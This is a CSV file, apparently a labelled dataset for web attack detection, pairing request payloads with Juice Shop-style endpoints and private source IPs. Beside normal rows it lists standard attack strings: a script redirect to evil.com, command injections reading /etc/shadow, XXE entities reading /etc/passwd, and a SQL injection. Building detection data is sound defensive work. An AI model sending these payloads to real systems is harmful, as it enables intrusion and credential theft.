attack_type,payload,endpoint,http_method,request_body,source_ip
normal,sort=price,/rest/admin/application-configuration,,,192.168.1.15
normal,product=1,/redirect,,,192.168.1.48
xss,<script>document.location='http://evil.com'</script>,/profile,,,192.168.1.60
rce,| ls -la /,/ftp,,,192.168.1.101
normal,sort=price,/rest/basket,,,192.168.1.35
normal,category=juice,/ftp,,,192.168.1.95
normal,page=1,/redirect,,,192.168.1.246
normal,email=user@test.com,/ftp,,,192.168.1.185
normal,email=user@test.com,/ftp,,,192.168.1.16
xss,<script>document.location='http://evil.com'</script>,/profile,,,192.168.1.243
normal,email=user@test.com,/profile,,,192.168.1.211
normal,product=1,/rest/basket,,,192.168.1.52
xxe,<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,/rest/user/login,,,192.168.1.177
rce,; cat /etc/shadow,/rest/basket,,,192.168.1.115
normal,email=user@test.com,/profile,,,192.168.1.203
xxe,<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,/ftp,,,192.168.1.218
normal,sort=price,/ftp,,,192.168.1.145
normal,page=1,/api/Products,,,192.168.1.119
xss,<script>document.location='http://evil.com'</script>,/redirect,,,192.168.1.219
xss,<img src=x onerror=alert(1)>,/rest/basket,GET,<img src=x onerror=alert(1)>,192.168.1.50
xss,<img src=x onerror=alert(1)>,/api/Products,GET,<img src=x onerror=alert(1)>,192.168.1.19
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/api/Products,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.128
normal,page=1,/rest/user/login,POST,page=1,192.168.1.231
normal,email=user@test.com,/api/Products,GET,email=user@test.com,192.168.1.212
sqli,' OR '1'='1' --,/ftp,GET,' OR '1'='1' --,192.168.1.111
rce,; cat /etc/shadow,/api/Products,POST,; cat /etc/shadow,192.168.1.226
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/api/Products,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.132
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/basket,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.206
normal,email=user@test.com,/redirect,POST,email=user@test.com,192.168.1.85
normal,category=juice,/profile,GET,category=juice,192.168.1.33
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,GET,<img src=x onerror=alert(1)>,192.168.1.56
